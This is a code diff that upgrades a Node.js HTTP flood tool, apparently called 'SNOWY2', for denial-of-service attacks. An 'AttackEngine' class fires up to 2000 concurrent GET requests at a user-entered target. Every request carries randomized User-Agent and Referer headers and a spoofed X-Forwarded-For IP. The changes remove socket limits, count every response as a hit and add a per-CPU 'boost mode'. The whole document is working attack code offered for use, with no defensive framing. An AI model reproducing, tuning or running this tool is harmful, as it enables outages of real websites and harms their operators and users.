@@ -7,36 +7,38 @@ const process = require('process');
 const readline = require('readline');
 const pLimit = require('p-limit').default;
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 80, 1000);
+const CPU_COUNT = os.cpus().length;
+const MAX_CONCURRENT = Math.min(CPU_COUNT * 150, 2000);
 const REQUEST_TIMEOUT = 10000;
-const ANIMATION = ['|', '/', '-', '\\'];
 
 const REFERERS = loadLines('refs.txt');
-const USER_AGENTS = loadLines('ua.txt'); // updated from ua.txt
+const USER_AGENTS = loadLines('ua.txt');
 
-const keepAliveHttp = new http.Agent({ keepAlive: true });
-const keepAliveHttps = new https.Agent({ keepAlive: true });
+const httpAgent = new http.Agent({
+    keepAlive: true,
+    maxSockets: Infinity,
+});
+const httpsAgent = new https.Agent({
+    keepAlive: true,
+    maxSockets: Infinity,
+});
 
-function loadLines(filename) {
+function loadLines(file) {
     try {
-        return fs.readFileSync(filename, 'utf8')
+        return fs.readFileSync(file, 'utf8')
             .split('\n')
-            .map(line => line.trim())
+            .map(l => l.trim())
             .filter(Boolean);
     } catch {
         return [];
     }
 }
 
-function randomUserAgent() {
-    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
+function randItem(arr, fallback = '') {
+    return arr[Math.floor(Math.random() * arr.length)] || fallback;
 }
 
-function randomReferer() {
-    return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
-}
-
-function randomIp() {
+function randIp() {
     return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
 }
 
@@ -48,24 +50,27 @@ class AttackEngine {
         this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
         this.limit = pLimit(MAX_CONCURRENT);
         this.boost = boost;
-        this.spinnerIndex = 0;
+        this.effects = ['🔥', '⚡', '💥', '⛏️', '🚀'];
+        this.fxIndex = 0;
     }
 
     async makeRequest() {
         const headers = {
-            'User-Agent': randomUserAgent(),
-            'Referer': randomReferer(),
-            'X-Forwarded-For': randomIp()
+            'User-Agent': randItem(USER_AGENTS, 'Mozilla/5.0'),
+            'Referer': randItem(REFERERS, 'https://google.com'),
+            'X-Forwarded-For': randIp()
         };
 
         try {
-            const response = await axios.get(this.target, {
+            await axios.get(this.target, {
                 headers,
                 timeout: REQUEST_TIMEOUT,
-                httpAgent: keepAliveHttp,
-                httpsAgent: keepAliveHttps
+                httpAgent,
+                httpsAgent,
+                maxRedirects: 0,
+                validateStatus: null
             });
-            return response.status === 200 ? 'SUCCESS' : 'ERROR';
+            return 'SUCCESS';
         } catch {
             return 'ERROR';
         }
@@ -75,17 +80,17 @@ class AttackEngine {
         const elapsed = (Date.now() - this.startTime) / 1000;
         const rps = (this.stats.total / elapsed).toFixed(1);
         this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
-        const spin = ANIMATION[this.spinnerIndex++ % ANIMATION.length];
+        const fx = this.effects[this.fxIndex++ % this.effects.length];
         process.stdout.write(
-            `\r${spin} ATTACKING | RPS: ${rps} | SUCCESS: ${this.stats.success} | ERRORS: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`
+            `\r${fx} POWER | RPS: ${rps} | HIT: ${this.stats.success} | ERR: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`
         );
     }
 
     async runLoop() {
-        const promises = Array.from({ length: MAX_CONCURRENT }, () =>
+        const batch = Array.from({ length: MAX_CONCURRENT }, () =>
             this.limit(() => this.makeRequest())
         );
-        const results = await Promise.allSettled(promises);
+        const results = await Promise.allSettled(batch);
         results.forEach(res => {
             this.stats.total++;
             if (res.status === 'fulfilled' && res.value === 'SUCCESS') {
@@ -103,12 +108,12 @@ class AttackEngine {
     }
 
     async runAttack() {
-        const statInterval = setInterval(() => this.displayStats(), 200);
+        const statInterval = setInterval(() => this.displayStats(), 150);
 
-        const boosters = [];
+        const boosterThreads = [];
         if (this.boost) {
-            for (let i = 0; i < os.cpus().length; i++) {
-                boosters.push(this.runBoostLoop());
+            for (let i = 0; i < CPU_COUNT; i++) {
+                boosterThreads.push(this.runBoostLoop());
             }
         }
 
@@ -118,14 +123,14 @@ class AttackEngine {
 
         clearInterval(statInterval);
         process.stdout.write('\n');
-        await Promise.allSettled(boosters);
+        await Promise.allSettled(boosterThreads);
         this.printSummary();
     }
 
     printSummary() {
         const elapsed = (Date.now() - this.startTime) / 1000;
         const avgRps = (this.stats.total / elapsed).toFixed(1);
-        console.log('\n\nATTACK COMPLETE');
+        console.log('\n\nATTACK FINISHED');
         console.log('='.repeat(60));
         console.log(`TARGET: ${this.target}`);
         console.log(`DURATION: ${elapsed.toFixed(1)}s`);
@@ -138,7 +143,7 @@ class AttackEngine {
     }
 }
 
-// Main
+// MAIN
 (async () => {
     console.log('\nSNOWY2 - T.ME/STSVKINGDOM');
     console.log('='.repeat(60));
@@ -149,19 +154,18 @@ class AttackEngine {
     });
 
     const ask = (q) => new Promise(res => rl.question(q, res));
-
     let target = await ask("TARGET: ");
     if (!target.startsWith("http")) target = "http://" + target;
+
     const duration = parseInt(await ask("TIME (seconds): "));
-    const boostChoice = await ask("ENABLE BOOST MODE? (yes/no): ");
+    const boost = await ask("ENABLE BOOST MODE? (yes/no): ");
     rl.close();
 
-    if (isNaN(duration)) return console.log("Invalid time input.");
-
-    const engine = new AttackEngine(target.trim(), duration, boostChoice.trim().toLowerCase() === 'yes');
-    try {
-        await engine.runAttack();
-    } catch (err) {
-        console.error("Attack failed:", err.message);
+    if (isNaN(duration)) {
+        console.log("Invalid time input.");
+        return;
     }
+
+    const engine = new AttackEngine(target.trim(), duration, boost.trim().toLowerCase() === 'yes');
+    await engine.runAttack();
 })();
